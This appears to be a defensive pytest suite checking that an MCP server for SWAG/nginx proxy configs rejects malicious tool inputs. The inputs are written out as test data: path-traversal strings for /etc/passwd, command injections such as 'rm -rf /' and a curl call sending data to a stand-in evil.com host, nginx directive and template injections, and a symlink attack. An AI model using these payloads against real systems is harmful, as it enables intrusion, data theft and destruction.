"""Security-focused behavior tests for SWAG MCP server.

Tests verify security behavior rather than implementation details,
focusing on how the server handles potentially malicious inputs.
"""

import os
from pathlib import Path

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError


class TestSecurityBehavior:
    """Security behavior tests for SWAG MCP tools and services."""

    @pytest.mark.asyncio
    async def test_path_traversal_prevention_behavior(self, mcp_client: Client):
        """Test server behavior against path traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "config/../../../etc/passwd",
            "/etc/passwd",
            "\\etc\\passwd",
            "config.conf/../../../sensitive-file",
        ]

        for malicious_path in path_traversal_attempts:
            # Test behavior: server should reject path traversal attempts
            with pytest.raises(ToolError) as exc_info:
                await mcp_client.call_tool("swag_view", {"config_name": malicious_path})

            # Verify security behavior: error should indicate validation failure
            error_msg = str(exc_info.value).lower()
            assert any(
                word in error_msg
                for word in [
                    "invalid",
                    "not allowed",
                    "validation",
                    "security",
                    "path",
                    "traversal",
                    "filename",
                    "must end",
                ]
            ), f"Path traversal attempt '{malicious_path}' should be blocked with: {error_msg}"

    @pytest.mark.asyncio
    async def test_injection_prevention_behavior(self, mcp_client: Client, mock_config):
        """Test server behavior against various injection attacks."""
        injection_attempts = [
            # Command injection in service name
            {
                "service_name": "test; rm -rf /",
                "server_name": "test.example.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            # Template injection
            {
                "service_name": "test{{7*7}}",
                "server_name": "test.example.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            # Null byte injection
            {
                "service_name": "test\x00malicious",
                "server_name": "test.example.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
            # Newline injection
            {
                "service_name": "test\nmalicious_directive on;",
                "server_name": "test.example.com",
                "upstream_app": "test",
                "upstream_port": 8080,
            },
        ]

        for attempt in injection_attempts:
            # Test behavior: server should reject injection attempts
            with pytest.raises(ToolError) as exc_info:
                await mcp_client.call_tool("swag_create", attempt)

            # Verify security behavior
            error_msg = str(exc_info.value).lower()
            assert any(
                word in error_msg for word in ["invalid", "validation", "not allowed", "characters"]
            ), f"Injection attempt should be blocked: {attempt['service_name']}"

    @pytest.mark.asyncio
    async def test_server_name_validation_behavior(self, mcp_client: Client):
        """Test server name validation against malicious domains."""
        malicious_server_names = [
            "evil.com; proxy_pass http://attacker.com;",  # Nginx injection
            "test.com\nproxy_pass http://evil.com;",  # Newline injection
            "$(curl http://evil.com/steal-data)",  # Command substitution
            "test.com/../../../etc/passwd",  # Path traversal in domain
            "test.com\x00evil.com",  # Null byte
            "a" * 300 + ".com",  # Extremely long domain
            "test..com",  # Invalid domain format
            ".test.com",  # Leading dot
            "test.com.",  # Trailing dot (might be OK)
        ]

        for malicious_domain in malicious_server_names:
            # Test behavior: server should validate domain names
            with pytest.raises(ToolError) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "test",
                        "server_name": malicious_domain,
                        "upstream_app": "test",
                        "upstream_port": 8080,
                    },
                )

            # Verify security behavior
            error_msg = str(exc_info.value).lower()
            assert any(
                word in error_msg for word in ["invalid", "domain", "validation", "format"]
            ), f"Malicious domain should be blocked: {malicious_domain}"

    @pytest.mark.asyncio
    async def test_upstream_parameter_validation_behavior(self, mcp_client: Client):
        """Test validation of upstream parameters for security issues."""
        malicious_upstreams = [
            # Command injection in upstream app
            {
                "upstream_app": "app; curl http://evil.com",
                "upstream_port": 8080,
            },
            # Template injection in upstream
            {
                "upstream_app": "app{{config.secret}}",
                "upstream_port": 8080,
            },
            # Invalid ports
            {
                "upstream_app": "app",
                "upstream_port": -1,
            },
            {
                "upstream_app": "app",
                "upstream_port": 99999,
            },
            # Upstream app with suspicious characters
            {
                "upstream_app": "app\nmalicious_config;",
                "upstream_port": 8080,
            },
        ]

        for malicious_upstream in malicious_upstreams:
            # Test behavior: server should validate upstream parameters
            with pytest.raises(ToolError) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "test",
                        "server_name": "test.example.com",
                        **malicious_upstream,
                    },
                )

            # Verify security behavior
            error_msg = str(exc_info.value).lower()
            assert any(
                word in error_msg
                for word in ["invalid", "validation", "port", "upstream", "parameter"]
            )

    @pytest.mark.asyncio
    async def test_config_content_sanitization_behavior(self, mcp_client: Client, sample_configs):
        """Test server behavior when editing configs with malicious content."""
        malicious_contents = [
            # Template injection attempts
            """# Normal config with template injection
server {
    listen 443;
    location / {
        proxy_pass http://upstream:8080;
        # Template injection attempt
        add_header X-Debug "{{ config.__class__.__base__.__subclasses__() }}";
    }
}""",
            # Command injection attempt
            """# Config with command injection
server {
    listen 443;
    location / {
        proxy_pass http://upstream:8080;
        # Command injection attempt
        error_log /var/log/nginx/error.log; cat /etc/passwd
    }
}""",
            # Log injection attempt
            """# Config with log injection
server {
    listen 443;
    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
    location / {
        proxy_pass http://upstream:8080;
        # Attempt to write to arbitrary files
        access_log /etc/passwd;
    }
}""",
        ]

        for _i, malicious_content in enumerate(malicious_contents):
            # Test behavior: server should reject dangerous content with proper error messages
            with pytest.raises(Exception) as exc_info:
                await mcp_client.call_tool(
                    "swag_edit",
                    {
                        "config_name": "testapp.subdomain.conf",
                        "new_content": malicious_content,
                        "create_backup": True,
                    },
                )

            # Security validation should reject malicious content
            error_msg = str(exc_info.value).lower()
            assert any(
                word in error_msg for word in ["dangerous", "invalid", "pattern", "security"]
            ), f"Error message should indicate security issue: {exc_info.value}"

            # Should not expose internal implementation details
            assert "traceback" not in error_msg, "Should not expose traceback"
            assert "valueerror" not in error_msg, "Should not expose internal exception type"

    @pytest.mark.asyncio
    async def test_resource_exhaustion_protection_behavior(self, mcp_client: Client, mock_config):
        """Test server behavior under resource exhaustion attacks."""

        # Test extremely large config content
        huge_content = "# Huge config\n" + "# Large comment block\n" * 100000

        result = await mcp_client.call_tool(
            "swag_create",
            {
                "service_name": "huge-test",
                "server_name": "huge.example.com",
                "upstream_app": "huge",
                "upstream_port": 8080,
            },
        )

        if not result.is_error:
            config_file = Path(mock_config.proxy_confs_path) / "huge-test.subdomain.conf"

            try:
                # Test behavior: server should handle large content appropriately
                edit_result = await mcp_client.call_tool(
                    "swag_edit",
                    {
                        "config_name": "huge-test.subdomain.conf",
                        "new_content": huge_content,
                    },
                )

                # Verify behavior: should either succeed or fail gracefully
                if edit_result.is_error:
                    error_msg = str(edit_result.error).lower()
                    assert any(
                        word in error_msg for word in ["size", "memory", "limit", "too large"]
                    )
                else:
                    # If successful, verify content is preserved
                    view_result = await mcp_client.call_tool(
                        "swag_view", {"config_name": "huge-test.subdomain.conf"}
                    )
                    assert not view_result.is_error
                    assert len(view_result.data) > 100000

            finally:
                if config_file.exists():
                    config_file.unlink()

    @pytest.mark.asyncio
    async def test_symlink_attack_prevention_behavior(self, mcp_client: Client, mock_config):
        """Test server behavior against symlink attacks."""
        config_dir = Path(mock_config.proxy_confs_path)

        # Create a sensitive file to test symlink protection
        sensitive_file = config_dir.parent / "sensitive.txt"
        sensitive_file.write_text("SECRET_CONTENT")

        # Create a symlink that points to the sensitive file
        symlink_path = config_dir / "evil-symlink.conf"

        try:
            if os.name != "nt":  # Skip on Windows where symlinks require admin
                os.symlink(sensitive_file, symlink_path)

                # Test behavior: server should not follow malicious symlinks
                with pytest.raises(ToolError) as exc_info:
                    await mcp_client.call_tool("swag_view", {"config_name": "evil-symlink.conf"})

                # Verify security behavior
                error_msg = str(exc_info.value).lower()
                # Should either detect symlink or fail to read
                assert "secret_content" not in error_msg.lower()

        finally:
            # Cleanup
            if symlink_path.exists():
                symlink_path.unlink()
            if sensitive_file.exists():
                sensitive_file.unlink()

    @pytest.mark.asyncio
    async def test_auth_method_validation_behavior(self, mcp_client: Client):
        """Test authentication method validation behavior."""
        invalid_auth_methods = [
            "none; malicious_directive on;",  # Injection attempt
            "auth_method{{7*7}}",  # Template injection
            "auth\nmalicious_config on;",  # Newline injection
            "custom_auth_method",  # Unknown method
            "",  # Empty string
            "a" * 100,  # Too long
        ]

        for invalid_auth in invalid_auth_methods:
            # Test behavior: server should validate auth methods
            with pytest.raises(ToolError) as exc_info:
                await mcp_client.call_tool(
                    "swag_create",
                    {
                        "service_name": "test",
                        "server_name": "test.example.com",
                        "upstream_app": "test",
                        "upstream_port": 8080,
                        "auth_method": invalid_auth,
                    },
                )

            # Verify security behavior
            error_msg = str(exc_info.value).lower()
            assert any(word in error_msg for word in ["invalid", "auth", "method", "validation"])
